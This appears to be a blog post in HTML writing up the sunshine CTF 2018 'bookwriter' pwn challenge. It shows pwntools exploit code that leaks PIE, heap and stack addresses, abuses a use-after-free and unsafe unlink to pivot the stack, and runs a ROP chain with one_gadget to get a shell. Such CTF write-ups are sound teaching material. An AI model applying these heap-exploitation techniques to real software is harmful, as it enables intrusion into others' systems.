@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title> sunshine CTF 2018 - bookwriter | kileak</title>
+
+
+
+
+
+<meta name="description" content="sunshine CTF 2018 - bookwriter">
+
+
+<meta name="keywords" content="0ctf">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2018/sunshince-bookwriter/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+        
+  </head>
+  <body class="single">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">sunshine CTF 2018 - bookwriter</h1>
+      <p class="post-meta">Apr 7, 2018</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>sunshine CTF 2018 - bookwriter
+<!--break--></p>
+
+  <p>I just invented the printing press, but my competitor developed a machine called BookWriter to assist with writing books. His machine allows you to write pages in any order you want, remove pages you don’t want, and then publish the entire book. This new invention will bury my business!</p>
+
+  <p>I’d like you to do what you can to destroy his new machine. If you take over control of BookWriter and give me evidence, I’ll give you a reward!</p>
+
+  <p>nc chal1.sunshinectf.org 20002</p>
+
+  <p>Author: hackucf_kcolley</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/bookwriter/bookwriter">bookwriter</a> <a href="https://kileak.github.io/assets/bookwriter/bookwriter.c">bookwriter.c</a> <a href="https://kileak.github.io/assets/bookwriter/libpwnableharness32.so">libpwnableharness32.so</a> <a href="https://kileak.github.io/assets/bookwriter/bookwriter-libc.so">libc</a> <a href="https://kileak.github.io/assets/bookwriter/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<div class="highlight"><pre><code class="language-text" data-lang="text">Welcome to BookWriter!
+
+A new, blank book has been created for you.
+
+Page number 1449408224:
+
+COVER
+
+What do you want to do?
+1. Flip to the previous page
+2. Flip to the next page
+3. Insert a new page after this one
+4. Remove this page
+5. Publish the book
+0. Discard changes and quit BookWriter</code></pre></div>
+
+<p>That page number already looks intriguing, just doing a <code>p/x</code> in gdb on it already shows something interesting, but where does this come from?</p>
+
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">Book</span><span class="o">*</span> <span class="nf">Book_create</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">Book</span><span class="o">*</span> <span class="n">book</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">book</span><span class="p">));</span>
+    <span class="n">book</span><span class="o">-&gt;</span><span class="n">current_page</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">g_cover</span><span class="p">;</span>
+    <span class="k">return</span> <span class="n">book</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="p">...</span>
+
+<span class="kt">bool</span> <span class="n">menu_input</span><span class="p">(</span><span class="n">Book</span><span class="o">*</span> <span class="n">book</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">line</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">line_size</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">Page number %u:</span><span class="se">\n\n</span><span class="s">%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span><span class="p">)</span><span class="n">book</span><span class="o">-&gt;</span><span class="n">current_page</span><span class="p">,</span> <span class="n">book</span><span class="o">-&gt;</span><span class="n">current_page</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span>
+        <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span></code></pre></div>
+
+<p>So, when the book gets initially created, current_page will point to <code>g_cover</code> (which is an address on <code>bss</code>). Thus, the page number shown in the first <code>menu_input</code> can be used to leak an address to get around <code>pie</code>.</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">&quot;chal1.sunshinectf.org&quot;</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">20002</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;Page number &quot;</span><span class="p">)</span>
+    <span class="n">PIELEAK</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;:&quot;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">))</span>
+    <span class="n">e</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">PIELEAK</span> <span class="o">-</span> <span class="mh">0x26e0</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;&gt;&quot;</span><span class="p">)</span>
+
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&quot;PIE leak       : </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PIELEAK</span><span class="p">))</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&quot;PIE            : </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+
+    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+    <span class="k">return</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">&quot;./bookwriter&quot;</span><span class="p">)</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">&quot;./bookwriter-libc.so&quot;</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+        <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">&quot;./bookwriter&quot;</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">&quot;LD_PRELOAD&quot;</span><span class="p">:</span><span class="s">&quot;./bookwriter-libc.so&quot;</span><span class="p">})</span>
+        <span class="n">pause</span><span class="p">()</span>
+        <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></div>
+
+<div class="highlight"><pre><code class="language-text" data-lang="text">[*] PIE leak       : 0x565b26e0
+[*] PIE            : 0x565b0000</code></pre></div>
+
+<p>Since <code>book-&gt;current_page</code> will always point to the address of the current page, we can also use the page number for leaking <code>heap</code>.</p>
+
+<p>Just create a page, which will get <code>malloc</code>ed on the heap, and the page number will show its address also.</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">insert_page</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&quot;3&quot;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&quot;END&quot;</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;Page number &quot;</span><span class="p">)</span>
+    <span class="n">HEAP</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;:&quot;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">))</span>
+
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;&gt; &quot;</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">HEAP</span>
+
+<span class="o">...</span>
+
+<span class="n">HEAP</span> <span class="o">=</span> <span class="n">insert_page</span><span class="p">(</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x40</span><span class="o">-</span><span class="mi">4</span><span class="p">))</span></code></pre></div>
+
+<div class="highlight"><pre><code class="language-text" data-lang="text">[*] HEAP leak      : 0x56a9a0b0</code></pre></div>
+
+<p>Ok, easy leaks out of the way.</p>
+
+<p>The next attack vector is an <code>uaf</code> bug in removing pages:</p>
+
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">BookPage_destroy</span><span class="p">(</span><span class="n">BookPage</span><span class="o">*</span> <span class="n">self</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">self</span> <span class="o">||</span> <span class="n">self</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">g_cover</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="c1">// Doubly linked list node unlink</span>
+    <span class="n">BookPage</span><span class="o">*</span> <span class="n">prev</span> <span class="o">=</span> <span class="n">self</span><span class="o">-&gt;</span><span class="n">prev</span><span class="p">;</span>
+    <span class="n">BookPage</span><span class="o">*</span> <span class="n">next</span> <span class="o">=</span> <span class="n">self</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+    <span class="n">prev</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">next</span><span class="p">;</span>
+    <span class="n">next</span><span class="o">-&gt;</span><span class="n">prev</span> <span class="o">=</span> <span class="n">prev</span><span class="p">;</span>
+    
+    <span class="n">free</span><span class="p">(</span><span class="n">self</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">);</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">self</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="p">...</span>
+<span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
+    <span class="c1">// Remove this page from the book</span>
+    <span class="n">BookPage_destroy</span><span class="p">(</span><span class="n">book</span><span class="o">-&gt;</span><span class="n">current_page</span><span class="p">);</span>
+    <span class="k">break</span><span class="p">;</span></code></pre></div>
+
+<p>For one, this looks pretty much like <code>unsafe unlink</code>, so we might abuse this later on. But for now, we can observe, that the current page gets <code>free</code>d, but <code>book-&gt;current_page</code> will still point to the freed chunk.</p>
+
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">BookPage</span> <span class="p">{</span>
+    <span class="kt">char</span><span class="o">*</span> <span class="n">text</span><span class="p">;</span>
+    <span class="n">BookPage</span><span class="o">*</span> <span class="n">prev</span><span class="p">;</span>
+    <span class="n">BookPage</span><span class="o">*</span> <span class="n">next</span><span class="p">;</span>
+<span class="p">};</span></code></pre></div>
+
+<p>A page is a chunk of size <code>0x10</code>, so we could now just create a new page with content of that size, which will overwrite the page metadata. With this we can control the <code>text</code> pointer and also the <code>prev</code> pointer.</p>
+
+<p>We can use this to leak an arbitrary address.</p>
+
+<ul>
+  <li>Create two pages</li>
+  <li>Flip to previous page</li>
+  <li>Remove the page</li>
+  <li>Create another page with <code>text</code> pointing to the address we want to leak</li>
+  <li>Since this will create a new page, which is inserted after our currently freed page (whose metadata we just overwrite), flip to previous page again</li>
+  <li>Read the content of the page (<code>text</code>)</li>
+</ul>
+
+<p>Since, we’ll be leaking a lot to get this stuff also working on the remote machine, let’s generalize it</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">leak_addr</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="nb">len</span><span class="o">=</span><span class="mi">4</span><span class="p">):</span>
+    <span class="n">insert_page</span><span class="p">(</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">50</span><span class="p">)</span>
+    <span class="n">insert_page</span><span class="p">(</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">50</span><span class="p">)</span>
+    <span class="n">flip_prev</span><span class="p">()</span>
+    <span class="n">remove_this</span><span class="p">()</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+    <span class="n">insert_page</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">flip_prev</span><span class="p">()</span>
+
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">()</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;:&quot;</span><span class="p">)</span>
+    <span class="n">LEAK</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;What&quot;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)[</span><span class="mi">2</span><span class="p">][:</span><span class="nb">len</span><span class="p">]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\x00</span><span class="s">&quot;</span><span class="p">))</span>
+
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;&gt; &quot;</span><span class="p">)</span>   
+    <span class="k">return</span> <span class="n">LEAK</span></code></pre></div>
+
+<p>Armed with this, we can start leaking some more interesting addresses.</p>
+
+<p>But to know, which values will be useful to us, let’s first think about, how this binary can be exploited at all.</p>
+
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// Doubly linked list node unlink</span>
+<span class="n">BookPage</span><span class="o">*</span> <span class="n">prev</span> <span class="o">=</span> <span class="n">self</span><span class="o">-&gt;</span><span class="n">prev</span><span class="p">;</span>
+<span class="n">BookPage</span><span class="o">*</span> <span class="n">next</span> <span class="o">=</span> <span class="n">self</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+<span class="n">prev</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">next</span><span class="p">;</span>
+<span class="n">next</span><span class="o">-&gt;</span><span class="n">prev</span> <span class="o">=</span> <span class="n">prev</span><span class="p">;</span></code></pre></div>
+
+<p>From our leak, we know, that we can overwrite page metadata, by adding a new page after removing the current page.</p>
+
+<p>Actually we can control the <code>text</code> and <code>prev</code> pointer for it.</p>
+
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">prev</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">next</span><span class="p">;</span></code></pre></div>
+
+<p>Since, we’re controlling <code>prev</code>, we can then write <code>next</code> (pointing to the following page) to an arbitrary address.</p>
+
+<p><code>_IO_file</code> would be a good target for this, but while this worked with my local libc, it stopped working when using the provided libc, so I trashed my exploit and went another way…</p>
+
+<div class="highlight"><pre><code class="language-asm" data-lang="asm"><span class="nf">gdb-peda$</span> <span class="no">x</span><span class="err">/</span><span class="mi">10</span><span class="no">i</span> <span class="mi">0x5662bf96</span>
+   <span class="err">0</span><span class="nf">x5662bf96</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">87</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">esp</span><span class="p">,</span><span class="mi">0x20</span>
+   <span class="err">0</span><span class="nf">x5662bf99</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">90</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">esp</span><span class="p">,</span><span class="err">[</span><span class="no">ebp-0x8</span><span class="err">]</span>
+   <span class="err">0</span><span class="nf">x5662bf9c</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">93</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">pop</span>    <span class="no">ecx</span>
+   <span class="err">0</span><span class="nf">x5662bf9d</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">94</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">pop</span>    <span class="no">ebx</span>
+   <span class="err">0</span><span class="nf">x5662bf9e</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">95</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">pop</span>    <span class="no">ebp</span>
+   <span class="err">0</span><span class="nf">x5662bf9f</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">96</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">esp</span><span class="p">,</span><span class="err">[</span><span class="no">ecx-0x4</span><span class="err">]</span>
+   <span class="err">0</span><span class="nf">x5662bfa2</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">99</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span></code></pre></div>
+
+<p>When you’ll <code>publish</code> the book, it will print out the pages, and return to main.</p>
+
+<p>In <code>main</code> it will pop <code>ecx</code> from the stack, and put esp to <code>ecx-0x4</code>.</p>
+
+<p>So, if we’d be able to overwrite the address, which get’s popped into <code>ecx</code> we could control esp.</p>
+
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">prev</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">next</span><span class="p">;</span></code></pre></div>
+
+<p>Right, we can store the stack address into prev (<code>-0x4</code>). <code>unlink</code> would then put the address of the next page there, pivoting the stack onto the heap right into our page. We’ll just have to prepare a ropchain waiting there, giving us a shell.</p>
+
+<p>As it turns out, it’s not that easy to get the correct stack address when <code>ASLR</code> kicks in.</p>
+
+<p>Normally you would just leak <code>__environ</code> and calculate the offset to the stack address, but this didn’t work at all in this challenge (not sure if it was due to <code>pwnableharness</code>). The offset always differs, so no chance.</p>
+
+<p>This took me way longer than expected, but after searching for a stack address <code>anywhere</code> in despair, I opted to leak <code>ld</code>, which contained a proper stack address.</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">LDLEAK</span> <span class="o">=</span> <span class="n">leak_addr</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x25e0</span><span class="p">)</span>
+<span class="n">ECX</span> <span class="o">=</span> <span class="n">leak_addr</span><span class="p">(</span><span class="n">LDLEAK</span> <span class="o">-</span> <span class="mh">0x8</span><span class="p">)</span></code></pre></div>
+
+<div class="highlight"><pre><code class="language-text" data-lang="text">[*] LD LEAK        : 0xf7724904
+[*] ECX            : 0xff91453c</code></pre></div>
+
+<p>This one remained stable even with <code>ASLR</code>, so now we can prepare a fake page on the heap, together with a ropchain and trigger an unlink to overwrite the value for <code>ecx</code>.</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&quot;Insert book page with page metadata pointing to ECX (in main ret)&quot;</span><span class="p">)</span>
+    
+<span class="n">payload1</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">HEAP</span> <span class="o">-</span> <span class="mh">0x1050</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ECX</span><span class="o">-</span><span class="mh">0xbc</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>            <span class="c"># Target address to overwrite with chunk</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">HEAP</span> <span class="o">-</span> <span class="mh">0xf90</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x00</span><span class="s">&quot;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x40</span><span class="o">-</span><span class="mi">4</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload1</span><span class="p">))</span>
+
+<span class="n">ID1</span> <span class="o">=</span> <span class="n">insert_page</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+<span class="n">ID2</span> <span class="o">=</span> <span class="n">insert_page</span><span class="p">(</span><span class="s">&quot;C&quot;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x40</span><span class="o">-</span><span class="mi">4</span><span class="p">))</span>
+<span class="n">ID3</span> <span class="o">=</span> <span class="n">insert_page</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x00</span><span class="s">&quot;</span><span class="o">*</span><span class="mi">316</span><span class="p">)</span>
+    
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&quot;Insert book page with ropchain&quot;</span><span class="p">)</span>
+
+<span class="n">POP4RET</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x1008</span>
+<span class="n">POPESI</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x00017828</span>
+<span class="n">ONE</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x3ac5c</span>
+    
+<span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">188</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">POP4RET</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">POPESI</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x1b2000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ONE</span><span class="p">)</span>
+
+<span class="n">ID4</span> <span class="o">=</span> <span class="n">insert_page</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></code></pre></div>
+
+<p>The first page just serves as a fake page (it isn’t referenced anywhere until now), which we can use for <code>unlink</code> later on.</p>
+
+<p>The last page just contains the ropchain, we want to execute later on.</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&quot;Remove page and overwrite page metadata pointing to our fake page&quot;</span><span class="p">)</span>
+<span class="n">flip_prev</span><span class="p">()</span>
+<span class="n">flip_prev</span><span class="p">()</span>
+
+<span class="n">remove_this</span><span class="p">()</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ID4</span><span class="p">)</span>                  <span class="c"># text</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">HEAP</span> <span class="o">+</span> <span class="mh">0x1ec</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span>    <span class="c"># prev</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">insert_page</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&quot;Remove fake page to overwrite ECX with pointer to ropchain&quot;</span><span class="p">)</span>
+
+<span class="n">flip_prev</span><span class="p">()</span>
+<span class="n">flip_prev</span><span class="p">()</span>
+
+<span class="n">remove_this</span><span class="p">()</span></code></pre></div>
+
+<p>And finally we’re using <code>unlink</code> for something useful.</p>
+
+<ul>
+  <li>Remove the current page</li>
+  <li>Insert another page, overwriting the metadata of the previous page</li>
+  <li>Flip to previous, so we’re in the page again, whose metadata we just overwrote</li>
+  <li>Flip again to previous, to get into our fake page (whose <code>prev</code> is now pointing to the <code>stack</code>).</li>
+</ul>
+
+<p>Now removing this page, will trigger</p>
+
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">prev</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">next</span><span class="p">;</span></code></pre></div>
+
+<p>finally writing the address of our ropchain chunk to the address, which will get popped into <code>ecx</code>later on.</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&quot;Publish to trigger shell&quot;</span><span class="p">)</span>
+    
+<span class="n">publish</span><span class="p">()</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></div>
+
+<p>And there it goes, printing the pages, getting our heap address into <code>ecx</code>, loading it into <code>esp</code>, pivoting the stack on the heap, executing the ropchain.</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">188</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">POP4RET</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">POPESI</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x1b2000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ONE</span><span class="p">)</span></code></pre></div>
+
+<p>We’ll just have to keep in mind, that the <code>ropchain</code> page also gets malformed by the unlink, putting a stack address in it. Thus the <code>pop4</code> gadget at the start, to get those out of the way.</p>
+
+<p><code>esi</code> was also filled with crap, and <code>one_gadget</code> wanted to have it point to <code>rw</code> section of libc, so we’ll just set it manually and call <code>one_gadget</code>.</p>
+
